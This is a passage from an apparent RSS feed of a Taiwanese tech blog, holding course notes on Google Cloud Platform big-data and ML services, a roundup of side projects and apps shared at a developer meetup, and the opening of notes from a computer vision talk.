&lt;li&gt;&lt;a href="https://drill.apache.org/"&gt;Apache drill&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pub/Sub  &lt;ul&gt;
&lt;li&gt;建立一個 big data 用的 queue  &lt;/li&gt;
&lt;li&gt;比較常用的案例是 IoT  &lt;/li&gt;
&lt;li&gt;可搭配 dataflow 作 big data 的運算  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dataflow  &lt;ul&gt;
&lt;li&gt;幫你整理資料  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dataproc  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Big Data&lt;/h2&gt;
&lt;h3&gt;Google BigQuery&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Fully-managed analytics data warehouse  &lt;ul&gt;
&lt;li&gt;provides a service for near real-time interactive analysis of massive datasets (hundreds of TBs)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Query using a SQL-like syntax (GQL)  &lt;/li&gt;
&lt;li&gt;Only pay for storage, processing used  &lt;/li&gt;
&lt;li&gt;Zero administration for performance and scale  &lt;/li&gt;
&lt;li&gt;Supports open standads  &lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;當作 storage 和 analyze 的工具  &lt;/li&gt;
&lt;li&gt;類似 &lt;a href="https://cassandra.apache.org/"&gt;Cassandra&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Column-based  &lt;/li&gt;
&lt;li&gt;1 TB 的資料大概花 6 秒就可以 scan 完  &lt;/li&gt;
&lt;li&gt;一次會幫你開很多機器去做運算，最後吐回一個結果給你  &lt;/li&gt;
&lt;li&gt;切忌用 &lt;code&gt;select *&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;有 dry run 可以先告訴你這個 Query 下下去會花多少錢  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Pub/Sub&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Scalable and reliable messaging for Google Cloud Platform and beyond  &lt;/li&gt;
&lt;li&gt;Supports many-to-many asynchronous messaging  &lt;/li&gt;
&lt;li&gt;Includes support for offline consumers  &lt;/li&gt;
&lt;li&gt;Based on proven Google technologies  &lt;/li&gt;
&lt;li&gt;Integrates with Cloud Dataflow for data processing pipelines  &lt;/li&gt;
&lt;li&gt;Uses push/pull subscriptions to topics  &lt;/li&gt;
&lt;li&gt;Use cases:  &lt;ul&gt;
&lt;li&gt;Building block for data ingestion in Dataflow, Internet of Things (IoT), Marketing Analytics  &lt;/li&gt;
&lt;li&gt;Foundation for Dataflow streaming  &lt;/li&gt;
&lt;li&gt;Push notifications for cloud-based applications  &lt;/li&gt;
&lt;li&gt;Connect applications across Google Cloud Platform (push/pull between Compute Engine and App Engine)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Dataflow&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Managed service for executing scalable and reliable data pipelines  &lt;/li&gt;
&lt;li&gt;Write code once and get batch and streaming  &lt;ul&gt;
&lt;li&gt;Transform-based programming model  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Clusters are sized for you  &lt;/li&gt;
&lt;li&gt;Processes data using Compute Engine instances  &lt;/li&gt;
&lt;li&gt;Integrates with GCP services like Cloud  Storage, Cloud Pub/Sub, BigQuery, Bigtable  &lt;/li&gt;
&lt;li&gt;Open source Java and Python SDKs  &lt;/li&gt;
&lt;li&gt;Use cases:  &lt;ul&gt;
&lt;li&gt;ETL (extract/transform/load) pipelines to move, filter, enrich, shape data  &lt;/li&gt;
&lt;li&gt;Data analysis - batch computation or continuous computation using streaming  &lt;/li&gt;
&lt;li&gt;Orchestration - create pipelines that coordinate services, including external services  &lt;ul&gt;
&lt;li&gt;可以很容易的和其他服務整合  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Dataproc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Fast, easy, managed way to run Hadoop and Spark/Hive/Pig on Google Cloud Platform  &lt;/li&gt;
&lt;li&gt;Benefit from cloud integration  &lt;ul&gt;
&lt;li&gt;Cloud Storage  &lt;/li&gt;
&lt;li&gt;Stackdriver  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Customize and configure clusters using initialization actions  &lt;/li&gt;
&lt;li&gt;Create clusters in 90 sec or less  &lt;/li&gt;
&lt;li&gt;Dataproc clusters billed minute-by-minute  &lt;ul&gt;
&lt;li&gt;Save money using preemptible instances for batch processing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scale clusters up and down even when jobs are running  &lt;/li&gt;
&lt;li&gt;Developer tools  &lt;ul&gt;
&lt;li&gt;RESTful API  &lt;/li&gt;
&lt;li&gt;Integration with Google Cloud SDK  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use cases:  &lt;ul&gt;
&lt;li&gt;Easily migrate on-premises Hadoop jobs to the cloud  &lt;/li&gt;
&lt;li&gt;Quickly analyze data (like log data) stored in Cloud Storage - create a cluster in less than 2 minutes then delete it immediately  &lt;/li&gt;
&lt;li&gt;Use Spark/Spark SQL to quickly to perform data mining and analysis  &lt;ul&gt;
&lt;li&gt;Spark SQL 可以讓你比較好操控資料  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use Spark Machine Learning Libraries (MLlib) to run classification algorithms  &lt;ul&gt;
&lt;li&gt;Spark 最強的部份就是 MLlib，但之後可能會被 Google 推出的 TensorFlow API 取代掉也不一定  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;Cluster  &lt;/li&gt;
&lt;li&gt;HDFS work node  &lt;/li&gt;
&lt;li&gt;完整的 Hadoop 類型服務  &lt;/li&gt;
&lt;li&gt;可以在 WebUI 上面選擇 node 數目  &lt;/li&gt;
&lt;li&gt;要自己寫 mapreduce  &lt;/li&gt;
&lt;li&gt;支援直接撈 Cloud Storage 的資料，甚至可以把資料送到 BigQuery  &lt;/li&gt;
&lt;li&gt;create cluster 後要 submit job，只要寫好 mapreduce 和 jar 檔，就可以直接幫你處理資料  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a href="https://datalab.cloud.google.com/"&gt;Google Cloud Datalab&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Interactive tool for large-scale data exploration, transformation, analysis, visualization  &lt;/li&gt;
&lt;li&gt;Analyze data in BigQuery, Compute Engine, and Cloud Storage using Python, SQL, and JavaScript  &lt;/li&gt;
&lt;li&gt;Easily deploy transformation, analysis models to BigQuery  &lt;/li&gt;
&lt;li&gt;Integrated, open source  &lt;ul&gt;
&lt;li&gt;Runs on Google App Engine  &lt;/li&gt;
&lt;li&gt;Built on Jupyter (formerly IPython)  &lt;/li&gt;
&lt;li&gt;Use Google Charts or matplotlib for easy visualizations  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Code, documentation, results, visualizations in intuitive notebook format  &lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;可以透過 Google 去銜接很多 Datasource，可以做整合，例如匯出報表。  &lt;/li&gt;
&lt;li&gt;有支援 BigQuery, Cloud Dataflow，可以利用他們去做分析  &lt;/li&gt;
&lt;li&gt;用法跟 Jupyter Notebook 差不多  &lt;/li&gt;
&lt;li&gt;是使用 Managed VM 來用 Datalab，該 VM 會裝一些套件，然後透過 GAE 去操作。  &lt;ul&gt;
&lt;li&gt;安裝好後會變成 GAE 裡頭的其中一個 service  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Machine Learning (Google Cloud ML)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/vision/"&gt;Vision API&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/speech/"&gt;Speech API&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/translate/docs/"&gt;Translate API&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/prediction/"&gt;Prediction API&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Google Cloud Machine Learning Use Cases  &lt;ul&gt;
&lt;li&gt;Structured Data  &lt;ul&gt;
&lt;li&gt;Classification / Regression  &lt;ul&gt;
&lt;li&gt;Customer churn analysis  &lt;/li&gt;
&lt;li&gt;Product diagnostics  &lt;/li&gt;
&lt;li&gt;Forecasting  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Recommendation  &lt;ul&gt;
&lt;li&gt;Content personalization  &lt;/li&gt;
&lt;li&gt;Product X-sells/up-sells  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Anomaly Detection  &lt;ul&gt;
&lt;li&gt;Fraud detection  &lt;/li&gt;
&lt;li&gt;Asset sensor diagnostics  &lt;/li&gt;
&lt;li&gt;Log metric anomalies  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unstructured Data  &lt;ul&gt;
&lt;li&gt;Image Analytics  &lt;ul&gt;
&lt;li&gt;Identify damaged shipments  &lt;/li&gt;
&lt;li&gt;Explicit content classification  &lt;/li&gt;
&lt;li&gt;Identify “styles” in images  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Text Analytics  &lt;ul&gt;
&lt;li&gt;Call center log analysis  &lt;/li&gt;
&lt;li&gt;Language identification  &lt;/li&gt;
&lt;li&gt;Topic classification  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sentiment analysis  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 7&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cp100-big-query/#0"&gt;Getting Started with BigQuery&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Questions&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;一個帳號可以管理的 Project 上限是多少？  &lt;/li&gt;
&lt;li&gt;GAE serving static 不用開 instance?  &lt;/li&gt;
&lt;li&gt;Project migration 的建議  &lt;/li&gt;
&lt;li&gt;Bigtable 和 BigQuery 的主要差異  &lt;/li&gt;
&lt;li&gt;GKE 的 MySQL cluster  &lt;/li&gt;
&lt;li&gt;GAE 的 Front-end instances 跟 Back-end instances 的差別  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;其實還有很多問題啦，只是沒有太多時間可以問，&lt;br /&gt;
而且要在網路上發問又必須描述的很詳細，&lt;br /&gt;
然後 Facebook 又是個黑洞，很難找之前的發文內容，&lt;br /&gt;
實在不太喜歡拿 Facebook 來問問題。&lt;br /&gt;
所以可能就自己 Google 、親自實驗或之後有機會再在 GCPUG.tw 當面問吧  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1&gt;相關連結&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/groups/GCPUG.TW/"&gt;https://www.facebook.com/groups/GCPUG.TW/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;臺灣的 Google Cloud Platform User Group，有問題歡迎在上面發問討論。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/products/calculator/"&gt;Google Cloud Platform Pricing Calculator | Google Cloud Platform&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GCP Pricing 試算  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/GoogleCloudPlatformTraining"&gt;https://github.com/GoogleCloudPlatformTraining&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GCP 教材的 Lab code  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;有種吃了 GCP 大還丹的感覺，需要時間消化。&lt;br /&gt;
能夠在上班時間來 Google Taipei 上課實在太棒了！&lt;br /&gt;
謝謝同事 Finley 一直被我煩被我問問題 XD&lt;br /&gt;
感謝老闆 Teddy，也感謝辛苦的講師 Simon。  &lt;/p&gt;
&lt;/blockquote&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Wed, 25 May 2016 22:47:00 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-05-25:posts/2016/05/25/cp100a-google-cloud-platform-fundamentals/</guid><category>Google Cloud Platform</category></item><item><title>Hacker Chips April Note</title><link>https://blog.m157q.tw/posts/2016/04/24/hacker-chips-april-note/</link><description>&lt;p&gt;&lt;a href="https://www.facebook.com/events/472611622946460/"&gt;https://www.facebook.com/events/472611622946460/&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;會知道這個 Meetup 是之前找工作的時候幫了我很多忙的 Jane 告訴我的，&lt;br /&gt;
看完簡介後想說那天晚上也沒事，就報個名。&lt;br /&gt;
原本以為是沒有排名的 Hackathon，&lt;br /&gt;
（個人很討厭那種要排名的假 Hackathon）&lt;br /&gt;
然後就去認識人然後寫寫 side project 這樣，&lt;br /&gt;
結果參加了以後發現其實就是很輕鬆的資訊分享會，&lt;br /&gt;
順便認識其他工程師。&lt;br /&gt;
大家聊聊自己的 side project 和介紹一些自己最近看到的一些有趣的東西這樣。&lt;br /&gt;
Friday Night 純聊天不寫 code 還蠻棒的 哈哈  &lt;/p&gt;
&lt;p&gt;老實說我還滿喜歡這種人數不多的聚會，&lt;br /&gt;
（聽說原本會有更多人來，不過貌似很多人報了名以後都忘記了XD）&lt;br /&gt;
因為參加其他人數比較多的 Meetup 的時候，&lt;br /&gt;
我大多都會遇到一些認識的，不然就是跟認識的一起去，所以就很少認識一些新的朋友。&lt;br /&gt;
而且人一多，又沒認識的人話，&lt;br /&gt;
依我這個社交零分的個性一定是打開電腦龜在角落開始 coding 之類的。  &lt;/p&gt;
&lt;p&gt;這次認識了一些新朋友，而且領域也不太一樣，感覺挺棒的。&lt;br /&gt;
（有兩個人的 side project 都是 Android App，使用者評分分別是 4.3 和 4.7，這分數高的我都要跪了）&lt;br /&gt;
最後 Jane 分享了好多聽都沒聽過的 App，根本就是 App 王啊。&lt;br /&gt;
還省了當天的晚餐和隔天的早餐 感謝 Sudo_ XD&lt;br /&gt;
下次竟然要兩個月後，好久啊啊啊！&lt;br /&gt;
不過這次我好像講太多東西，而且講的有點久，下次有點不知道要講啥了 XDrz  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;然後下面列出在這次聚會中被分享的東西們&lt;br /&gt;
（有些我可能沒記到）  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/linkedin2md"&gt;GitHub - M157q/linkedin2md: Export public LinkedIn profile to Markdown format&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;(Python) 把 Public LinkedIn Profile 轉成 Markdown  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/vinta/pangu.js"&gt;GitHub - vinta/pangu.js: 為什麼你們就是不能加個空格呢？&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;空白之神，不要問是什麼，點進去看就知道了。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://chrome.google.com/webstore/detail/%E7%82%BA%E4%BB%80%E9%BA%BC%E4%BD%A0%E5%80%91%E5%B0%B1%E6%98%AF%E4%B8%8D%E8%83%BD%E5%8A%A0%E5%80%8B%E7%A9%BA%E6%A0%BC%E5%91%A2%EF%BC%9F/paphcfdffjnbcgkokihcdjliihicmbpd"&gt;為什麼你們就是不能加個空格呢？ - Chrome Web Store&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/zdict/zdict"&gt;GitHub - zdict/zdict: The last online dictionary framework you need. (?)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;(Python) 用 Terminal 查線上字典，適合討厭用 Web browser 開分頁的 CLI 控。（像我就是）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://vinta.ws/blog/695"&gt;軟體工程師的鄙視鏈（程序员的鄙视链） | 真．他媽的&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看了沒笑的人，肯定不是軟體工程師。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://twitter.com/50NerdsofGrey"&gt;50 Nerds of Grey (@50NerdsofGrey) | Twitter&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;(English)《格雷的五十種阿宅》（？）  &lt;/li&gt;
&lt;li&gt;裏面有很多很好笑的阿宅哏，像是這個 &lt;a href="https://twitter.com/50NerdsofGrey/status/640985632941064192"&gt;50 Nerds of Grey on Twitter: "'I've been a very bad girl,' she said, biting her lip. 'I need to be punished.' 'Very well,' he said and installed Windows 10 on her laptop."&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://weekly.codetengu.com/"&gt;CodeTengu Weekly 碼天狗週刊&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;由臺灣的工程師們撰寫的技術資訊分享週刊，每星期一早上十點出刊，標題都很有哏。  &lt;/li&gt;
&lt;li&gt;內容比較偏技術導向，較適合工程師們看。  &lt;/li&gt;
&lt;li&gt;報導的領域視當期的 curators 而定。  &lt;/li&gt;
&lt;li&gt;通常報導的內容比較新，而且會有些原創內容。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://weekly.techbridge.cc/"&gt;TechBridge Weekly 技術週刊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;另外一個臺灣的技術週刊，每星期六出刊。  &lt;/li&gt;
&lt;li&gt;比較沒那麼技術導向，從事資訊業的應該都可以看看，範圍蠻廣的，News, Web, Mobile, UI/UX, Data 等等，也會有些跟創業相關的資訊。  &lt;/li&gt;
&lt;li&gt;內容比較多是中國那邊的簡體中文文章  &lt;/li&gt;
&lt;li&gt;沒那麼新，會有一些比較舊的高人氣文章。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://powerbi.microsoft.com/en-us/"&gt;Power BI | Interactive Data Visualization BI Tools&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;由 Microsoft 提供的一個方便的 Data Visualization 工具，要付費。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://chartio.com/"&gt;Cloud Business Intelligence | Chartio&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;也是個 Data Visualization 的工具，有免費版跟付費版，功能好像也蠻強大的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ui.cn/"&gt;UI中国-专业界面交互设计平台&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;有很多 templates 可以參考。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.holiestep.msgpeepingtom&amp;amp;hl=zh_TW"&gt;已讀不回助理 - Google Play Android 應用程式&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;其中一位參加者 Tony 的 Side Project  &lt;/li&gt;
&lt;li&gt;可以讓你看到訊息，但對方不會知道你已讀，適合給很常用 IM 聊天的人用。（像我就不太需要QQ）  &lt;/li&gt;
&lt;li&gt;支援 7 種 IM  &lt;/li&gt;
&lt;li&gt;Google Play 評分 4.3  &lt;/li&gt;
&lt;li&gt;可以幫你計算對方的神隱率跟好聊率 （這個可能要用了才知道是什麼）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jintin/jgit"&gt;GitHub - Jintin/jgit: jgit is a command line tool to help you manage multiple separate git-base project in local file system.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;幫你同時對多個 Git Repositories 下同樣的指令  &lt;ul&gt;
&lt;li&gt;我個人的認知是有點類似 &lt;code&gt;git submodule foreach&lt;/code&gt; 的感覺  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Jintin/aliasme"&gt;GitHub - Jintin/aliasme: A shell script to organize your alias in command line.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Jintin/Swimat"&gt;GitHub - Jintin/Swimat: An Xcode formatter plug-in to format your swift code.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;幫你自動 format swift code 的 Xcode Plugin  &lt;ul&gt;
&lt;li&gt;我覺得有點類似 &lt;code&gt;go fmt&lt;/code&gt; 這樣  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.jintin.pm25.tw&amp;amp;hl=zh_TW"&gt;J霧霾 - 台灣空氣品質監控 - Google Play Android 應用程式&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;(App) 就是看空氣汙染程度  &lt;/li&gt;
&lt;li&gt;Google Play 上評分 4.7 !!  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.jb.good.night.android.free&amp;amp;hl=en"&gt;Good Night, Android! FREE - Android Apps on Google Play&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;每天晚上 10 點到隔天凌晨 4 點，幫你隨機配對一個人，配對成功 5 秒後，會開啟 7 分鐘的通話，跟陌生人聊天。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.magisto.com/"&gt;Video Editing By Magisto | An Automatic Online Video Editor&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;(App) 自動幫你把照片或影片加上許多特效，處理成看起來很專業的影片。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://vitotechnology.com/star-walk.html"&gt;Vito Technology - iPhone, iPad, iPod Touch and MacOS Educational Apps&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;(App) 手機對著夜空就會在手機上顯示對著的星星和衛星的位置，特效還蠻潮的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.hackerparadise.org/"&gt;Hacker Paradise: A Traveling Community for Developers, Designers, and Other Creative Types.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;邊環遊世界邊玩邊工作的一群人們  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wanqu.co/"&gt;湾区日报：关注创业与技术，每天推送5篇优质英文文章&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;還不錯的資訊科技新聞分享平台，只由一個人負責維護，採用 ChatOps 管理，詳細可看這篇文章：&lt;a href="https://wanqu.co/blog/2015-05-24-behind-the-scenes.html?s=home"&gt;湾区日报是如何运作的？ | 湾区日报 Blog&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/2014Grab.a.Bite/"&gt;Grab a Bite 幸福提食&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;今天聚會中的培根三明治和火腿三明治就是這家買的，覺得還不錯吃。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;最後幫忙工商服務一下&lt;br /&gt;
&lt;a href="https://sudo.com.tw/"&gt;Sudo_&lt;/a&gt; 最近有在徵 Web Front-end Developer，&lt;br /&gt;
歡迎有興趣的人去應徵 XD  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Sat, 30 Apr 2016 02:00:00 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-04-24:posts/2016/04/24/hacker-chips-april-note/</guid><category>Hacker Chips</category><category>Sudo_</category><category>Meetup</category></item><item><title>視訊訊號處理與深度學習應用</title><link>https://blog.m157q.tw/posts/2016/04/23/video-signal-processing-and-the-application-of-deep-learning/</link><description>&lt;ul&gt;
&lt;li&gt;&lt;a href="http://dsc.kktix.cc/events/video-signal"&gt;http://dsc.kktix.cc/events/video-signal&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://datasci.tw/event/vision_and_learning/"&gt;http://datasci.tw/event/vision_and_learning/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Slides: &lt;a href="http://www.slideshare.net/tw_dsconf/ss-61255961"&gt;http://www.slideshare.net/tw_dsconf/ss-61255961&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://drive.google.com/file/d/0B9cCeTKOkfWITllMazh2a0ctZVk/view?usp=sharing"&gt;備份&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;【判讀】電腦視覺簡介&lt;/h1&gt;
&lt;h2&gt;Real Cases in Computer Vision&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Character Recognition (LeNet)  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=4LxlhoemR3A"&gt;Microsoft PhotoSynth&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=ohmajJTcpNk"&gt;Video Reenactment&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Auto Driving  &lt;ul&gt;
&lt;li&gt;Autonomous Cars - NVIDIA Drive PX2  &lt;ul&gt;
&lt;li&gt;Object class recognition  &lt;/li&gt;
&lt;li&gt;Semantic Segmentation  &lt;ul&gt;
&lt;li&gt;分辨出哪裡是車子可以開的地方  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Radar  &lt;ul&gt;
&lt;li&gt;用雷射去掃周邊的環境，可以很快速的去辨認，但跟電腦視覺比較無關。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;電子後照鏡  &lt;ul&gt;
&lt;li&gt;解決視線死角問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=gUIKtqyUIo8"&gt;Grandma rides a Tesla&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Trip Wire  &lt;/li&gt;
&lt;li&gt;Loitering  &lt;/li&gt;
&lt;li&gt;People Count  &lt;/li&gt;
&lt;li&gt;Speed Test  &lt;ul&gt;
&lt;li&gt;不用都卜勒雷達算，直接用影像計算。  &lt;/li&gt;
&lt;li&gt;不小心歪掉就不準了，所以大家知道怎麼躲這種測速了吧 （XDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Smart Daily  &lt;ul&gt;
&lt;li&gt;用監視器的影像辨認人臉打卡。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Smart Fast Forward (Skywatch 的產品)  &lt;ul&gt;
&lt;li&gt;用影像辨識來判斷農舍監視器畫面中哪些時間是有人的，主要是用來定期追蹤是否有記得噴灑農藥。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Structure from motion  &lt;/li&gt;
&lt;li&gt;3D Reconstruction  &lt;/li&gt;
&lt;li&gt;Person tracking  &lt;/li&gt;
&lt;li&gt;Face detection  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Relationship to Data Science?&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Rich info, lots of data (in terms of bits)  &lt;/li&gt;
&lt;li&gt;Unstructured, usually without much context / semantics  &lt;/li&gt;
&lt;li&gt;Difficult to process and query  &lt;/li&gt;
&lt;li&gt;We are generating them every day  &lt;ul&gt;
&lt;li&gt;要變成人類歷史的一部份，轉化成可搜尋的話，是個問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;A Brief History of Computer Vision&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;1966, Marvin Minsky  &lt;ul&gt;
&lt;li&gt;50 年過後，我們還沒完全解決這個問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
